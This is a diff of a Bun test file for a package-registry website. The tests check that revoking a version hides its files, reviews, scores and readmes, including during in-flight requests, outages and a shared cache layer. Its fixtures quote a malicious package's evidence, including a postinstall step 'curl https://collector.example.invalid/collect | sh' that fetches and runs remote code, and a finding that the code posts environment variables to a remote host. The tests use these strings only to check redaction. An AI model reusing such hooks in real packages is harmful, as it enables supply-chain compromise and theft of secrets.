@@ -1,34 +1,36 @@
-// Revocation against requests that overlap: a GET still in flight when the registry starts refusing a version, a
-// background refresh, a burst of views, and the cached review and score answers that quote a version's source. The
-// registry is a fetch stub whose answers this file controls, down to holding one request until the test releases it.
+// Revocation through the site's own reads, against a registry stub whose answers this file controls, down to holding
+// one request until the test releases it. The site keeps no answer that carries a version's source (file text,
+// excerpts, readmes, review quotes, score evidence) and no record of whether a version may be shown, so every view is
+// the registry's answer to a request sent after the view began. Each test named "review finding N" turns one finding
+// of the review of c926e6e into a check that failed on that commit.
 import { afterAll, afterEach, beforeAll, describe, expect, mock, setSystemTime, spyOn, test } from "bun:test";
-import { z } from "zod";
-import { POLICIES } from "./edge-cache";
+import { NextRequest } from "next/server";
 import { fileStatus } from "./package-status";
-import { askServable, fetchJson, type Fetched } from "./registry-fetch";
-import { fileApiPath, REGISTRY, servableKey } from "./registry-url";
+import { fileApiPath, packageApiPath, REGISTRY } from "./registry-url";
 
 // lib/registry.ts is the server entry point; outside Next its marker import would throw
 void mock.module("server-only", () => ({}));
 
-const { getReview, getVersionScore } = await import("./registry");
+const { getFile, getPackage, getReview, getVersionScore } = await import("./registry");
+const { GET: readmeRoute } = await import("../app/api/readme/route");
 
 const T0 = Date.parse("2026-11-12T12:00:00Z");
-const FileDoc = z.object({ kind: z.literal("text"), text: z.string() });
+const SOURCE = "collector.example.invalid";
 
 type Answer = { status: number; body?: unknown };
 
-type Held = { method: string; path: string; release: (a: Answer) => void };
+type Held = { path: string; release: (a: Answer) => void };
 
-/** The registry's answer per path (both methods); 200 with a small file when unset. */
+/** The registry's answer per path; a small file when unset. */
 const answers = new Map<string, Answer>();
 
-/** "METHOD path" of the next request to hold until the test releases it. */
+/** Paths whose next request (any method) is held until the test releases it. */
 const toHold = new Set<string>();
 
 const held: Held[] = [];
-const seen: { method: string; path: string; at: number }[] = [];
+const seen: { method: string; path: string }[] = [];
 const realFetch = globalThis.fetch;
+const FILE = { name: "x", version: "1.0.0", path: "index.js", size: 5, kind: "text", text: `see ${SOURCE}` };
 
 function respond(a: Answer, method: string): Response {
   return new Response(method === "HEAD" ? null : JSON.stringify(a.body ?? { error: `answered ${a.status}` }), { status: a.status, headers: { "content-type": "application/json" } });
@@ -40,12 +42,12 @@ beforeAll(() => {
 
     if (!url.startsWith(REGISTRY)) return realFetch(input, init);
     const path = `/${url.slice(REGISTRY.length)}`;
-    const method = init?.method ?? "GET";
-    seen.push({ method, path, at: Date.now() });
+    const method = (input instanceof Request ? input.method : init?.method) ?? "GET";
+    seen.push({ method, path });
 
-    if (toHold.delete(`${method} ${path}`)) return new Promise((resolve) => held.push({ method, path, release: (a) => resolve(respond(a, method)) }));
+    if (toHold.delete(path)) return new Promise((resolve) => held.push({ path, release: (a) => resolve(respond(a, method)) }));
 
-    return Promise.resolve(respond(answers.get(path) ?? { status: 200, body: { kind: "text", text: "hello" } }, method));
+    return Promise.resolve(respond(answers.get(path) ?? { status: 200, body: FILE }, method));
   };
 
   spyOn(globalThis, "fetch").mockImplementation(Object.assign(stub, { preconnect: realFetch.preconnect }));
@@ -59,16 +61,16 @@ afterAll(() => {
   mock.restore();
 });
 
-/** The request held for `method` and `path`, once the code under test has sent it. */
-async function heldRequest(method: string, path: string): Promise<Held> {
+/** The request held for `path`, once the code under test has sent it. */
+async function heldRequest(path: string): Promise<Held> {
   for (let i = 0; i < 200; i++) {
-    const at = held.findIndex((h) => h.method === method && h.path === path);
+    const at = held.findIndex((h) => h.path === path);
 
     if (at >= 0) return held.splice(at, 1)[0] ?? Promise.reject(new Error("unreachable"));
     await Bun.sleep(1);
   }
 
-  throw new Error(`no ${method} ${path} was sent`);
+  throw new Error(`no request for ${path} was sent`);
 }
 
 function fileOf(name: string) {
@@ -78,128 +80,23 @@ function fileOf(name: string) {
   return {
     target,
     path,
-    view: (): Promise<Fetched<z.infer<typeof FileDoc>>> => fetchJson({ url: `${REGISTRY}${fileApiPath(target)}`, schema: FileDoc, cache: POLICIES.versionFile, servable: servableKey(target) }),
-    answer: (status: number) => answers.set(path, { status, body: status === 200 ? { kind: "text", text: "hello" } : undefined }),
-    hold: (method: string) => toHold.add(`${method} ${path}`),
-    asked: (method: string, since: number) => seen.filter((s) => s.method === method && s.path === path && s.at >= since).length,
+    view: () => getFile(target),
+    answer: (status: number) => answers.set(path, { status, body: status === 200 ? FILE : undefined }),
+    hold: () => toHold.add(path),
+    asked: () => seen.filter((s) => s.path === path).length,
   };
 }
 
 const GONE = { kind: "unavailable", reason: { kind: "status", status: 410 } } as const;
 
-describe("a slow request and a revoke", () => {
-  test("a GET sent before the revoke and answered after a 410 does not make the file servable again", async () => {
-    const f = fileOf("race-held-get");
-    setSystemTime(T0);
-    f.hold("GET");
-    const old = f.view();
-    const get = await heldRequest("GET", f.path);
-
-    // the revoke: a HEAD a second later is refused
-    setSystemTime(T0 + 1_000);
-    f.answer(410);
-    expect(await fileStatus(f.target)).toBe("refused");
-
-    // the old GET comes back with the bytes; its own caller asked before the revoke and gets them
-    setSystemTime(T0 + 3_000);
-    get.release({ status: 200, body: { kind: "text", text: "before the revoke" } });
-    expect((await old).kind).toBe("ok");
-
-    // within five seconds of the old GET, still: the next view asks the registry and is refused
-    setSystemTime(T0 + 4_000);
-    expect(await f.view()).toEqual(GONE);
-    expect(f.asked("GET", T0 + 4_000) + f.asked("HEAD", T0 + 4_000)).toBe(1);
-    // and ten seconds after the revoke
-    setSystemTime(T0 + 11_000);
-    expect(await f.view()).toEqual(GONE);
-  });
-
-  test("a yes counts from when its request started: a GET that took 6 seconds is checked again at once", async () => {
-    const f = fileOf("race-slow-get");
-    setSystemTime(T0);
-    f.hold("GET");
-    const first = f.view();
-    const get = await heldRequest("GET", f.path);
-    setSystemTime(T0 + 6_000);
-    get.release({ status: 200, body: { kind: "text", text: "hello" } });
-    expect((await first).kind).toBe("ok");
-
-    setSystemTime(T0 + 6_500);
-    expect((await f.view()).kind).toBe("ok");
-    expect(f.asked("HEAD", T0 + 6_500)).toBe(1);
-  });
-
-  test("a background refresh sent before the revoke does not undo it", async () => {
-    const f = fileOf("race-background");
-    setSystemTime(T0);
-    expect((await f.view()).kind).toBe("ok");
-
-    // the bytes are stale: the view checks the version with a HEAD, serves them, and refreshes them in the background
-    const tb = T0 + POLICIES.versionFile.freshMs + 1_000;
-    setSystemTime(tb);
-    f.hold("GET");
-    expect((await f.view()).kind).toBe("ok");
-    const refresh = await heldRequest("GET", f.path);
-
-    setSystemTime(tb + 6_000);
-    f.answer(410);
-    expect(await fileStatus(f.target)).toBe("refused");
-    setSystemTime(tb + 7_000);
-    refresh.release({ status: 200, body: { kind: "text", text: "hello" } });
-    await Bun.sleep(5);
-
-    setSystemTime(tb + 8_000);
-    expect(await f.view()).toEqual(GONE);
-  });
-
-  test("the permission to serve and the no it records outlive every request that could still answer", () => {
-    expect(POLICIES.servableRecord.freshMs).toBeGreaterThan(20_000);
-    expect(POLICIES.servableRecord.freshMs).toBeGreaterThan(POLICIES.servable.freshMs);
-  });
-});
-
-describe("a burst of views", () => {
-  test("views of one file that miss the permission at once send one HEAD", async () => {
-    const f = fileOf("burst");
-    setSystemTime(T0);
-    await f.view();
-
-    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
-    const since = Date.now();
-    f.hold("HEAD");
-    const views = [f.view(), f.view(), f.view()];
-    const status = fileStatus(f.target);
-    const head = await heldRequest("HEAD", f.path);
-    await Bun.sleep(5);
-    expect(f.asked("HEAD", since)).toBe(1);
-    head.release({ status: 200 });
-
-    expect((await Promise.all(views)).map((v) => v.kind)).toEqual(["ok", "ok", "ok"]);
-    expect(await status).toBe("ok");
-  });
-
-  test("a caller that gives up does not wait on a HEAD it shares", async () => {
-    const f = fileOf("burst-abort");
-    const servable = servableKey(f.target);
-    setSystemTime(T0);
-    f.hold("HEAD");
-    const first = askServable({ url: `${REGISTRY}${fileApiPath(f.target)}`, servable });
-    const head = await heldRequest("HEAD", f.path);
-    const abort = new AbortController();
-    const second = askServable({ url: `${REGISTRY}${fileApiPath(f.target)}`, servable, signal: abort.signal });
-    abort.abort();
-    expect((await second).kind).toBe("unavailable");
-    head.release({ status: 200 });
-    expect((await first).kind).toBe("ok");
-  });
-});
-
-// ---------- answers that quote a version's source ----------
+// ---------- registry answers that carry source ----------
 const reviewPath = (name: string) => `/-/apm/v1/review/${name}/1.0.0`;
 const scorePath = (name: string) => `/-/apm/v1/score/${name}/1.0.0`;
+const packagePath = (name: string) => `/${packageApiPath(name)}`;
 
+/** A review answer. */
 function reviewBody(name: string, redacted: boolean) {
-  const finding = { file: "index.js", line: 2, quote: redacted ? "" : "collector.example", excerpt: redacted ? "" : "https.request({ host: 'collector.example' })", issue: "Posts process.env to a remote host.", severity: "high" };
+  const finding = { file: "index.js", line: 2, quote: redacted ? "" : SOURCE, excerpt: redacted ? "" : `https.request({ host: '${SOURCE}' })`, issue: "Posts process.env to a remote host.", severity: "high" };
 
   return {
     name,
@@ -213,8 +110,9 @@ function reviewBody(name: string, redacted: boolean) {
   };
 }
 
+/** A score; withheld, it lists the signal with no evidence, as the registry's allowlist sends it. */
 function scoreBody(name: string, redacted: boolean) {
-  const evidence = redacted ? ["index.js:2", "package.json scripts.postinstall"] : ["index.js:2: https.request({ host: 'collector.example' })", "package.json scripts.postinstall: curl collector.example | sh"];
+  const evidence = redacted ? [] : [`index.js:2: https.request({ host: '${SOURCE}' })`, `package.json scripts.payload (run by scripts.postinstall): curl https://${SOURCE}/collect | sh`];
 
   return {
     name,
@@ -227,80 +125,246 @@ function scoreBody(name: string, redacted: boolean) {
   };
 }
 
-describe("cached review and score answers of a version that gets revoked", () => {
-  test("a cached review is read again once the version's permission is a few seconds old, and the redacted answer is shown", async () => {
-    const name = "gate-review";
+/** A package answer with a readme and a latest score, as the registry sends it. */
+function packageBody(input: { name: string; readme: string; score: Omit<ReturnType<typeof scoreBody>, "redacted"> | null; readmeVersion: string | null }) {
+  return {
+    name: input.name,
+    source: "local",
+    description: "",
+    readme: input.readme,
+    readmeVersion: input.readmeVersion,
+    distTags: { latest: "1.0.0" },
+    maintainers: ["alice"],
+    latest: "1.0.0",
+    facts: null,
+    score: input.score,
+    versions: [{ version: "1.0.0", publishedAt: "2026-11-12T00:00:00Z", publishedBy: "alice", status: "active", statusReason: null, deprecated: null, score: null, grade: null }],
+  };
+}
+
+const README = `# demo\n\nReports to ${SOURCE}.`;
+
+/** What a registry from before the redaction sends: the same answers without `redacted` and `readmeVersion`. */
+const legacy = {
+  review: (name: string) => {
+    const { redacted: _redacted, ...old } = reviewBody(name, false);
+
+    return old;
+  },
+  score: (name: string) => {
+    const { redacted: _redacted, ...old } = scoreBody(name, false);
+
+    return old;
+  },
+  package: (name: string) => {
+    const { readmeVersion: _readmeVersion, ...old } = packageBody({ name, readme: README, score: legacy.score(name), readmeVersion: null });
+
+    return old;
+  },
+};
+
+describe("a view and a revoke", () => {
+  // review finding 4: a view after the revoke joined an older shared HEAD and served the cached file on its yes
+  test("review finding 4: a view sent after the revoke is refused while an older request for the file is still out", async () => {
+    const f = fileOf("race-shared-head");
+    setSystemTime(T0);
+    expect((await f.view()).kind).toBe("ok");
+
+    // past the old 5 s permission window, so the old code asked the registry with a HEAD here
+    setSystemTime(T0 + 6_000);
+    f.hold();
+    const before = f.view();
+    const older = await heldRequest(f.path);
+
+    f.answer(410);
+    setSystemTime(T0 + 6_500);
+    const after = f.view();
+
+    // the older request was answered before the revoke reached the registry
+    older.release({ status: 200, body: FILE });
+    expect((await before).kind).toBe("ok");
+    expect(await after).toEqual(GONE);
+    expect(await f.view()).toEqual(GONE);
+  });
+
+  test("a GET sent before the revoke and answered after it does not make the file servable again", async () => {
+    const f = fileOf("race-slow-get");
+    f.hold();
+    const old = f.view();
+    const request = await heldRequest(f.path);
+
+    f.answer(410);
+    expect(await f.view()).toEqual(GONE);
+    request.release({ status: 200, body: FILE });
+    expect((await old).kind).toBe("ok");
+    expect(await f.view()).toEqual(GONE);
+  });
+
+  test("a review and a score read right after the revoke are the registry's redacted answers", async () => {
+    const name = "race-review-score";
     answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
-    setSystemTime(T0);
-    const first = await getReview(name, "1.0.0");
-    expect(first.kind === "ok" && first.value.review?.findings[0]?.excerpt).toContain("collector.example");
-
-    // revoked: the registry now sends the review without excerpts; the cached copy is still within its stale window
-    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
-    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
-    const after = await getReview(name, "1.0.0");
-    expect(after.kind).toBe("ok");
-    expect(JSON.stringify(after)).not.toContain("collector.example");
-    expect(after.kind === "ok" && after.value.review?.findings[0]?.line).toBe(2);
-  });
-
-  test("a revoke heard through a file's 410 hides a cached score at once, before its own cache runs out", async () => {
-    const name = "gate-score";
-    const file = fileOf(name);
     answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
-    setSystemTime(T0);
-    expect(JSON.stringify(await getVersionScore(name, "1.0.0"))).toContain("collector.example");
+    expect(JSON.stringify(await getReview(name, "1.0.0"))).toContain(SOURCE);
+    expect(JSON.stringify(await getVersionScore(name, "1.0.0"))).toContain(SOURCE);
 
-    setSystemTime(T0 + 1_000);
-    file.answer(410);
+    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
     answers.set(scorePath(name), { status: 200, body: scoreBody(name, true) });
-    expect(await fileStatus(file.target)).toBe("refused");
+    const review = await getReview(name, "1.0.0");
+    const score = await getVersionScore(name, "1.0.0");
 
-    // the score's own cache is fresh for a minute
-    setSystemTime(T0 + 2_000);
-    const after = await getVersionScore(name, "1.0.0");
-    expect(after.kind).toBe("ok");
-    expect(JSON.stringify(after)).not.toContain("collector.example");
-    expect(after.kind === "ok" && after.value.signals[0]?.evidence).toEqual(["index.js:2", "package.json scripts.postinstall"]);
+    expect(JSON.stringify([review, score])).not.toContain(SOURCE);
+    expect(review.kind === "ok" && review.value.review?.findings[0]?.line).toBe(2);
+    expect(score.kind === "ok" && score.value.signals.map((s) => s.id)).toEqual(["network"]);
   });
 
-  test("a redacted answer is a no for the version's files as well", async () => {
-    const name = "gate-review-then-file";
-    const file = fileOf(name);
-    setSystemTime(T0);
-    expect((await file.view()).kind).toBe("ok");
+  test("when the registry can't be read, no review, score or file is shown from before", async () => {
+    const name = "race-outage";
+    const f = fileOf(name);
+    answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
+    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
+    await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), f.view()]);
 
-    setSystemTime(T0 + 1_000);
+    for (const path of [reviewPath(name), scorePath(name), f.path]) answers.set(path, { status: 503 });
+    const down = await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), f.view()]);
+
+    expect(down.map((d) => d.kind)).toEqual(["unavailable", "unavailable", "unavailable"]);
+    expect(JSON.stringify(down)).not.toContain(SOURCE);
+  });
+});
+
+describe("a package's readme and evidence", () => {
+  // review finding 3: a package with no score was never checked again, so its cached readme outlived the revoke
+  test("review finding 3: a package with no score shows the registry's readme of the moment, not a cached one", async () => {
+    const name = "pkg-no-score";
+    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: null, readmeVersion: "1.0.0" }) });
+    setSystemTime(T0);
+    expect(JSON.stringify(await getPackage(name))).toContain(SOURCE);
+
+    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: "", score: null, readmeVersion: null }) });
+    setSystemTime(T0 + 6_000);
+    const after = await getPackage(name);
+
+    expect(after.kind).toBe("ok");
+    expect(JSON.stringify(after)).not.toContain(SOURCE);
+  });
+
+  test("review finding 3: an outage shows neither the readme nor the evidence from before", async () => {
+    const name = "pkg-outage";
+    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: scoreBody(name, false), readmeVersion: "1.0.0" }) });
+    setSystemTime(T0);
+    expect(JSON.stringify(await getPackage(name))).toContain(SOURCE);
+
+    answers.set(packagePath(name), { status: 503 });
+    setSystemTime(T0 + 6_000);
+    const down = await getPackage(name);
+
+    expect(down).toEqual({ kind: "unavailable", reason: { kind: "status", status: 503 } });
+  });
+
+  test("review finding 3: /api/readme reads the registry every time and tells every cache not to keep it", async () => {
+    const name = "pkg-api-readme";
+    const ask = () => readmeRoute(new NextRequest(`https://apmjs.dev/api/readme?name=${name}`));
+    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: null, readmeVersion: "1.0.0" }) });
+    const first = await ask();
+
+    expect(first.headers.get("cache-control")).toBe("private, no-store");
+    expect(await first.text()).toContain(SOURCE);
+
+    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: "", score: null, readmeVersion: null }) });
+    const second = await ask();
+
+    expect(second.headers.get("cache-control")).toBe("private, no-store");
+    expect(await second.text()).toBe("");
+    expect(seen.filter((s) => s.path === packagePath(name)).length).toBe(2);
+  });
+});
+
+// review finding 5: a site deployed before its registry read the old registry's answers, which carry no `redacted`
+// and no `readmeVersion`, as "not redacted" and showed their source even after the site had seen the version refused
+describe("review finding 5: answers from a registry too old to redact", () => {
+  test("a review, score or package answer without the redaction fields is refused, not shown", async () => {
+    const name = "legacy-registry";
+    const f = fileOf(name);
+    f.answer(410);
+    expect(await f.view()).toEqual(GONE);
+    answers.set(reviewPath(name), { status: 200, body: legacy.review(name) });
+    answers.set(scorePath(name), { status: 200, body: legacy.score(name) });
+    answers.set(packagePath(name), { status: 200, body: legacy.package(name) });
+
+    const answers_ = await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), getPackage(name)]);
+
+    expect(answers_.map((a) => a.kind)).toEqual(["unavailable", "unavailable", "unavailable"]);
+    expect(JSON.stringify(answers_)).not.toContain(SOURCE);
+  });
+});
+
+// ---------- a second cache layer ----------
+// review finding 6: the Cache API layer (shared by every isolate in a data center) held an older yes that outranked
+// this isolate's newer no. Bun has no Cache API, so a Map-backed one stands in, and its writes can be held back the way
+// a write from another isolate lands late. Bun defines no `Cache` or `caches`, so nothing is shadowed.
+class MapCache {
+  readonly entries = new Map<string, { body: string; headers: [string, string][] }>();
+  frozen = false;
+
+  async match(req: Request): Promise<Response | undefined> {
+    const e = this.entries.get(req.url);
+
+    return e ? new Response(e.body, { headers: e.headers }) : undefined;
+  }
+
+  async put(req: Request, res: Response): Promise<void> {
+    const body = await res.text();
+
+    if (!this.frozen) this.entries.set(req.url, { body, headers: [...res.headers] });
+  }
+
+  async delete(req: Request): Promise<boolean> {
+    return this.frozen ? false : this.entries.delete(req.url);
+  }
+}
+
+describe("review finding 6: a second cache layer", () => {
+  const shared = new MapCache();
+
+  beforeAll(() => {
+    Reflect.set(globalThis, "Cache", MapCache);
+    Reflect.set(globalThis, "caches", { default: shared });
+  });
+
+  // Bun has neither (checked above the class), so the test leaves none behind
+  afterAll(() => {
+    Reflect.deleteProperty(globalThis, "Cache");
+    Reflect.deleteProperty(globalThis, "caches");
+  });
+
+  test("an older yes in the shared layer can't outrank a newer refusal: the view after the refusal is refused", async () => {
+    const name = "layers-allow-deny";
+    const f = fileOf(name);
+    setSystemTime(T0);
+    expect((await f.view()).kind).toBe("ok");
+    await Bun.sleep(10);
+
+    // the revoke; this isolate hears it from the review, and its shared write of the refusal has not landed
+    shared.frozen = true;
+    f.answer(410);
     answers.set(reviewPath(name), { status: 200, body: reviewBody(name, true) });
-    file.answer(410);
+    setSystemTime(T0 + 1_000);
     expect((await getReview(name, "1.0.0")).kind).toBe("ok");
 
-    // the file's yes is a second old, but the review said the version is revoked since
     setSystemTime(T0 + 2_000);
-    expect(await file.view()).toEqual(GONE);
+    expect(await f.view()).toEqual(GONE);
+    expect(await fileStatus(f.target)).toBe("refused");
+    shared.frozen = false;
   });
 
-  test("when the registry can't be asked, a cached review is shown without its excerpts", async () => {
-    const name = "gate-review-outage";
+  test("nothing that carries source is written to the shared layer", async () => {
+    const name = "layers-nothing-kept";
     answers.set(reviewPath(name), { status: 200, body: reviewBody(name, false) });
-    setSystemTime(T0);
-    await getReview(name, "1.0.0");
+    answers.set(scorePath(name), { status: 200, body: scoreBody(name, false) });
+    answers.set(packagePath(name), { status: 200, body: packageBody({ name, readme: README, score: scoreBody(name, false), readmeVersion: "1.0.0" }) });
+    await Promise.all([getReview(name, "1.0.0"), getVersionScore(name, "1.0.0"), getPackage(name), fileOf(name).view()]);
+    await Bun.sleep(10);
 
-    answers.set(reviewPath(name), { status: 503 });
-    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
-    const down = await getReview(name, "1.0.0");
-    expect(down.kind).toBe("ok");
-    expect(JSON.stringify(down)).not.toContain("collector.example");
-    expect(down.kind === "ok" && down.value.review?.findings[0]?.issue).toBe("Posts process.env to a remote host.");
-  });
-
-  test("an answer that quotes no source is served from the cache as before", async () => {
-    const name = "gate-score-clean";
-    answers.set(scorePath(name), { status: 200, body: { ...scoreBody(name, false), signals: [] } });
-    setSystemTime(T0);
-    await getVersionScore(name, "1.0.0");
-    setSystemTime(T0 + POLICIES.servable.freshMs + 1_000);
-    expect((await getVersionScore(name, "1.0.0")).kind).toBe("ok");
-    expect(seen.filter((s) => s.path === scorePath(name)).length).toBe(1);
+    expect([...shared.entries.values()].map((e) => e.body).join("\n")).not.toContain(SOURCE);
   });
 });
